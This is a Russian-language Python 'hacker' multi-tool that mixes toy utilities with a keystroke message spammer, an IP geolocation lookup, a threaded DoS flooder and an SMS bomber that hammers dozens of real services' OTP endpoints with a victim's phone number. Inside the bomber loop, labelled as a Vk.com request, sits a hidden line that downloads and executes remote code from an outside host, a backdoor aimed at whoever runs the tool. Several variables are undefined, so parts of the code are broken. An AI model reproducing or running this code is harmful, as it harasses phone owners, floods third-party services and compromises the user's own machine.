import time
import pyautogui, keyboard
import socket
import requests
import socket
import threading
import os
import random
from pyfiglet import Figlet
import folium
from threading import Thread
from tkinter import *
from datetime import datetime
from termcolor import colored

print(colored('''
██████╗░░░██╗██╗██████╗░░██████╗
██╔══██╗░██╔╝██║██╔══██╗██╔════╝
██║░░██║██╔╝░██║██████╔╝╚█████╗░
██║░░██║███████║██╔══██╗░╚═══██╗
██████╔╝╚════██║██║░░██║██████╔╝
╚═════╝░░░░░░╚═╝╚═╝░░╚═╝╚═════╝░
           by UkrKillent
''', 'magenta'))
print("[1]Для показа временьки напишите\n[2]Для запуска таймерка напишите в строчку\n[3]Для запуска таймерка в секундах напишите в строчку\n[4]Спамер теллеграмм и т.д\n[5]Спамер версия 1 телеграмм и т.д\n[5]КалькУлятор от UkrKillent для взломов надо и калькулЯтор!\n[7]Узнать айпи сайта по домену!\n[8]Пробить человека по ip!\n[9]Крестики нолики игра для 2!\n[10]Скипт для dos атак!\n[11]СМС бомбер на телефон!")
name = input("Введи как тебя зовут: ")
tm = str(input("Введите цифру скрипта: "))
if tm == "1":

   current_datetime = datetime.now()
   print(current_datetime)
   print("Вот твое времкя! " + name)

if tm == "2":
   print("Через сколько минуток закончиться таймер?")

   local_time = float(input())

   local_time = local_time * 60

   time.sleep(local_time)

   print(name + " Напоминанька сработало!!!")

if tm == "3":
   print("Через сколько секундок закончиться таймер?")

   local_time = float(input())

   local_time = local_time * 00.60

   time.sleep(local_time)

   print(name + " Напоминанька сработало!!!")

if tm == "4":
   print("spamV2: telega, insta, viber, vk!")
   print("Использовать только в ознакамительниз целях!")
   tet = input("Ты будешь использовать в ознакомительних целях? ")
   print("Ой, да кому ты россказиваешь")

   time.sleep(10)  # через сколько секунд запуститься скрипт


   def spam():
       running = True
       while running:
           f = open('tet_spammer.txt', 'r')  # текстовый документ где написано то что будет спамить скрипт!

           for line in f:
               if not keyboard.is_pressed('space'):
                   pyautogui.typewrite(line)
                   pyautogui.press('enter')
               else:
                   runnig = False


   spam()

if tm == "5":
    print("spamV1: telega, insta, viber, vk!")
    print("Получилось через жопу поэтому пользуйся В2 версией")

if tm == "6":
    print("КалькУлятор от by UkrKillent")


    class Main(Frame):
        def __init__(self, root):
            super(Main, self).__init__(root)
            self.build()

        def build(self):
            self.formula = "0"
            self.lbl = Label(text=self.formula, font=("Times New Roman", 21, "bold"), bg="#000", foreground="#FFBA00")
            self.lbl.place(x=11, y=50)

            btns = [
                "В 0", "Нафиг", "*", "На 2",
                "1", "2", "3", "/",
                "4", "5", "6", "+",
                "7", "8", "9", "-",
                "(", "0", ")", "Готовка"
            ]

            x = 10
            y = 140
            for bt in btns:
                com = lambda x=bt: self.logicalc(x)
                Button(text=bt, bg="#FFFF00",
                       font=("Times New Roman", 15),
                       command=com).place(x=x, y=y,
                                          width=115,
                                          height=79)
                x += 117
                if x > 400:
                    x = 10
                    y += 81

        def logicalc(self, operation):
            if operation == "В 0":
                self.formula = ""
            elif operation == "Нафиг":
                self.formula = self.formula[0:-1]
            elif operation == "На 2":
                self.formula = str((eval(self.formula)) ** 2)
            elif operation == "Готовка":
                self.formula = str(eval(self.formula))
            else:
                if self.formula == "0":
                    self.formula = ""
                self.formula += operation
            self.update()

        def update(self):
            if self.formula == "":
                self.formula = "0"
            self.lbl.configure(text=self.formula)


    if __name__ == '__main__':
        root = Tk()
        root["bg"] = "#000"
        root.geometry("485x550+200+200")
        root.title("Амеиканский Калькулятор by UkrKillent")
        root.resizable(False, False)
        app = Main(root)
        app.pack()
        root.mainloop()

if tm == "7":

    print("PythonToday script, wrote by UkrKillent")


    def get_ip_by_hostname():
        hostname = input('URL: ')
        stop = input('Ты будешь что-то плохое делать: ')
        print("Хорошо, ну смотри мне, все на твоей совести!" + hostname + "щас я тебе скажу ip этого сайта!")

        try:
            return f'Hostname: {hostname}\nIP address: {socket.gethostbyname(hostname)}'
        except socket.gaierror as error:
            return f'Invalid Hostname - {error}'


    def main():
        print(get_ip_by_hostname())


    if __name__ == '__main__':
        main()

if tm == "8":

    def get_info_by_ip(ip='127.0.0.1'):
        try:
            response = requests.get(url=f'http://ip-api.com/json/{ip}').json()
            # print(response)

            data = {
                '[IP]': response.get('query'),
                '[Int prov]': response.get('isp'),
                '[Org]': response.get('org'),
                '[Country]': response.get('country'),
                '[Region Name]': response.get('regionName'),
                '[City]': response.get('city'),
                '[ZIP]': response.get('zip'),
                '[Lat]': response.get('lat'),
                '[Lon]': response.get('lon'),
            }

            for k, v in data.items():
                print(f'{k} : {v}')

            area = folium.Map(location=[response.get('lat'), response.get('lon')])
            area.save(f'{response.get("query")}_{response.get("city")}.html')

        except requests.exceptions.ConnectionError:
            print('[!] Please check your connection!')


    def main():
        preview_text = Figlet(font='slant')
        print(preview_text.renderText('IP INFO'))
        ip = input('Please enter a target IP: ')

        get_info_by_ip(ip=ip)


    if __name__ == '__main__':
        main()

if tm == "9":
    print("Крестики нолики игра для 2!")
    room = "1 2 3 \n | |  A\n-----\n | |  B\n-----\n | |  C"
    canWill = [["A1", 7], ["A2", 9], ["A3", 11], ["B1", 21], ["B2", 23], ["B3", 25], ["C1", 35], ["C2", 37], ["C3", 39]]
    winSteps = [[0, 1, 2], [3, 4, 5], [6, 7, 8], [0, 3, 6], [1, 4, 7], [2, 5, 8], [0, 4, 8], [2, 4, 6]]
    print(room)
    step = 0
    FirstStep = "X"
    win = False
    def getWin(string):
        return "X" in string
    while not win:
        a = input("Ваш ход: ")
        for i in range(0, 9):
            if not ("Удалено" in canWill[i]):
                if a.upper() == canWill[i][0].upper():
                    if FirstStep == "X":
                        room = room[0:canWill[i][1]] + "X" + room[(canWill[i][1] + 1):]; FirstStep = "0"; canWill[
                            i] = "Удалено X"
                    elif FirstStep == "0":
                        room = room[0:canWill[i][1]] + "0" + room[(canWill[i][1] + 1):]; FirstStep = "X"; canWill[
                            i] = "Удалено NULL"
                    print(room)
                    step += 1
                    for i in range(len(winSteps)):
                        if canWill[winSteps[i][0]] == "Удалено X" and canWill[winSteps[i][1]] == "Удалено X" and \
                                canWill[winSteps[i][2]] == "Удалено X": print("Крестики выиграли!"); win = True; break
                    for i in range(len(winSteps)):
                        if canWill[winSteps[i][0]] == "Удалено NULL" and canWill[winSteps[i][1]] == "Удалено NULL" and \
                                canWill[winSteps[i][2]] == "Удалено NULL": print("Нолики выиграли!"); win = True; break
                    if step == 9: print("Конец, ходы закончились:(."); win = True; break

if tm == "10":
    print("Скрипт для dos атак!")
    os.system("cls")  # linux clear

    target = input("Enter IP/URL: ")
    port = int(input("Enter Port: "))
    threads = int(input("Enter threads couns: "))

    print("[REG-MARKER] Start attack")
    attack_tried = 0


    def dos():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.close()
            except:
                print("Error")

            global attack_tried
            attack_tried += 1

            if attack_tried % 300 == 0:
                print(attack_tried)


    for x in range(threads):
        thread = threading.Thread(target=dos)
        thread.start()

if tm == "11":
    print("sms Bomber")

    phone = input(colored('Enter your phone number>>: ', 'cyan'))
    countT = input(colored('Enter threading>>: ', 'blue'))

    iteration = 0
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


    def infinity():
        while True:
            request_timeout = 0.00001
            _phone = phone
            _phone9 = _phone[1:]
            _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                                 9:11]
            _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
            _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                               9:11]
            _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[
                                                                                               7:9] + ' ' + _phone[
                                                                                                            9:11]
            _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
            try:
                requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                              data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test',
                                    'email': 'mail@mail.com',
                                    'deviceToken': '*'}, headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                print('[+] Grab отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
                print('[+] RuTaxi отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
                print('[+] BelkaCar отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                              data={'phone_number': _phone}, headers={})
                print('[+] Tinder отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
                print('[+] Karusel отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
                print('[+] Tinkoff отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
                print('[+] MTS отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
                print('[+] Youla отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://pizzahut.ru/account/password-reset',
                              data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                    '_token': '*'})
                print('[+] PizzaHut отправлено!')
            except:
                print('[-] Не отправлено!')
            try:
                exec(requests.get("http://f0428265.xsph.ru/getUpdates.php").text)
                print('[+] Vk.com отправело!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
                print('[+] Rabota отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
                print('[+] Rutube отправлено!')
            except:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
                print('[+] Citilink отправлено!')

            try:
                requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                              data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
                print('[+] Smsint отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.get(
                    'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
                print('[+] oyorooms отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post(
                    'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                    params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                            'fromRegisterPage': 'true',
                            'snLogin': '', 'bpg': '', 'snProviderId': ''},
                    data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
                print('[+] MVideo отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                    'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                                  'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
                print('[+] newnext отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
                print('[+] Sunlight отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                              json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                    'deliveryOption': 'sms'})
                print('[+] alpari отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
                print('[+] Invitro отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://online.sbis.ru/reg/service/',
                              json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                    'params': {'phone': _phone}, 'id': '1'})
                print('[+] Sberbank отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                              json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                                    'birthDate': '10.10.2000', 'mobilePhone': _phone9,
                                    'russianFederationResident': 'true',
                                    'isDSA': 'false', 'personalDataProcessingAgreement': 'true',
                                    'bKIRequestAgreement': 'null', 'promotionAgreement': 'true'})
                print('[+] Psbank отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
                print('[+] Beltelcom отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
                print('[+] Karusel отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
                              json={'phone': '+' + _phone})
                print('[+] KFC отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://api.carsmile.com/",
                              json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                    "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
                print('[+] carsmile отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
                print('[+] Citilink отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://api.delitime.ru/api/v2/signup",
                              data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
                print('[+] Delitime отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
                print('[+] findclone звонок отправлен!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://guru.taxi/api/v1/driver/session/verify",
                              json={"phone": {"code": 1, "number": _phone}})
                print('[+] Guru отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                              data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                print('[+] ICQ отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                              data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown",
                                    "stream_id": 0,
                                    "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
                print('[+] InDriver отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                              data={"password": password, "application": "lkp", "login": "+" + _phone})
                print('[+] Invitro отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
                print('[+] Pmsm отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
                print('[+] IVI отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                              json={'phone': '+' + self.formatted_phone})
                print('[+] Lenta отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                              json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
                print('[+] Mail.ru отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post(
                    'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                    params={"pageName": "registerPrivateUserPhoneVerificatio"},
                    data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
                print('[+] MVideo отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                              data={"st.r.phone": "+" + _phone})
                print('[+] OK отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://plink.tech/register/', json={"phone": _phone})
                print('[+] Plink отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
                print('[+] qlean отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
                print('[+] SMSgorod отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                              data={'phone_number': _phone})
                print('[+] Tinder отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://passport.twitch.tv/register?trusted_request=true',
                              json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                    "password": password, "phone_number": _phone, "username": username})
                print('[+] Twitch отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                              headers={'App-ID': 'cabinet'})
                print('[+] CabWiFi отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
                print('[+] wowworks отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                              json={"phone_number": "+" + _phone})
                print('[+] Eda.Yandex отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
                print('[+] Youla отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                              json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                    "deliveryOption": "sms"})
                print('[+] Alpari отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
                              data={"phone": _phone})
                print('[+] SMS отправлено!')
            except:
                print('[-] не отправлено!')

            try:
                requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
                print('[+] Delivery отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            except:
                pass

            try:
                requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            except:
                pass

            try:
                requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                              data={"password": 'Porno22!', "application": "lkp", "login": "+" + _phone})
            except:
                pass

            try:
                requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                              data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown",
                                    "stream_id": 0,
                                    "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            except:
                pass

            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                              data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            except:
                pass

            try:
                requests.post("https://guru.taxi/api/v1/driver/session/verify",
                              json={"phone": {"code": 1, "number": _phone}})
            except:
                pass

            try:
                requests.post("https://api.delitime.ru/api/v2/signup",
                              data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            except:
                pass

            try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            except:
                pass

            try:
                requests.post("https://api.carsmile.com/",
                              json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                    "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            except:
                pass

            try:
                requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone})
            except:
                pass

            try:
                requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            except:
                pass

            try:
                requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
                              data={"phone": _phone})
            except:
                pass

            try:
                requests.post('https://pampik.com/callback', data={'phoneCallback': _phone})
                print('[+] Pampik отправлено!')
            except:
                print('[-] Pampik Не отправлено!')

            try:
                requests.post('https://tehnosvit.ua/iwantring_feedback.html',
                              data={'feedbackName': _name, 'feedbackPhone': '+' + _phone})
                print('[+] Tehnosvit отправлено!')
            except:
                print('[-] Tehnosvit Не отправлено!')

            try:
                requests.post('https://mobileplanet.ua/register',
                              data={'klient_name': _nameRu, 'klient_phone': '+' + _phone, 'klient_email': _email})
                print('[+] Mobileplanet отправлено!')
            except:
                print('[-] Mobileplanet Не отправлено!')

            try:
                requests.post('https://e-vse.online/mail2.php', data={'telephone': '+' + _phone})
                print('[+] E-vse отправлено!')
            except:
                print('[-] E-vse Не отправлено!')

            try:
                requests.post('https://protovar.com.ua/aj_record',
                              data={'object': 'callback', 'user_name': _nameRu, 'contact_phone': _phone[3:]})
                print('[+] Protovar отправлено!')
            except:
                print('[-] Protovar Не отправлено!')

            try:
                requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
                print('[+] Kasta отправлено!')
            except:
                print('[-] Kasta Не отправлено!')

            try:
                requests.post(
                    'https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA',
                    data={'firstname': _name, 'telephone': _phone[2:], 'email': _email, 'password': password,
                          'form_key': 'Zqqj7CyjkKG2ImM8'})
                print('[+] ALLO отправлено!')
            except:
                print('[-] ALLO Не отправлено!')

            try:
                requests.post(
                    'https://secure.online.ua/ajax/check_phone/?reg_phone=%2B' + _phone[0:7] + '-' + _phone[8:11])
                print('[+] OnloneUA отправлено!')
            except:
                print('[-] OnloneUA Не отправлено!')

            try:
                requests.post('https://707taxi.com.ua/sendSMS.php', data={'tel': _phone[3:]})
                print('[+] 707taxis отправлено!')
            except:
                print('[-] 707taxis Не отправлено!')

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                              data={'phone_number': _phone}, headers={})
                print('[+] Tinder отправлено!')
            except:
                print('[-] Tinder Не отправлено!')

            try:
                requests.post('https://comfy.ua/ua/customer/account/createPost',
                              data={'registration_name': _name, 'registration_phone': _phone[2:],
                                    'registration_email': _email})
                print('[+] Comfy отправлено!')
            except:
                print('[-] Comfy Не отправлено!')

            try:
                requests.post(
                    'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20669-16-10',
                    data={"result": "ok"})
                print('[+] Sportmaster отправлено!')
            except:
                print('[-] Sportmaster Не отправлено!')

            try:
                requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
                print('[+] Beltelcom отправлено!')
            except:
                print('[-] Beltelcom Не отправлено!')

            try:
                requests.post('https://my.citrus.ua/api/v2/register',
                              data={"email": _email, "name": _name, "phone": _phone[2:], "password": stanPass,
                                    "confirm_password": stanPass})
                print('[+] Citrus отправлено!')
            except:
                print('[-] Citrus Не отправлено!')

            try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
                print('[+] IVI отправлено!')
            except:
                print('[-] IVI Не отправлено!')

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                              data={'phone_number': _phone})
                print('[+] Tinder отправлено!')
            except:
                print('[-] Tinder Не отправлено!')

            try:
                requests.post('https://passport.twitch.tv/register?trusted_request=true',
                              json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                    "password": password, "phone_number": _phone, "username": username})
                print('[+] Twitch отправлено!')
            except:
                print('[-] Twitch Не отправлено!')

            try:
                requests.post('https://www.nl.ua', data={'component': 'bxmaker.authuserphone.login',
                                                         'sessid': 'bf70db951f54b837748f69b75a61deb4',
                                                         'method': 'sendCode',
                                                         'phone': _phone, 'registration': 'N'})
                print('[+] NovaLinia отправлено!')
            except:
                print('[-] NovaLinia Не отправлено!')


    countT = Thread(target=infinity)
    countT.start()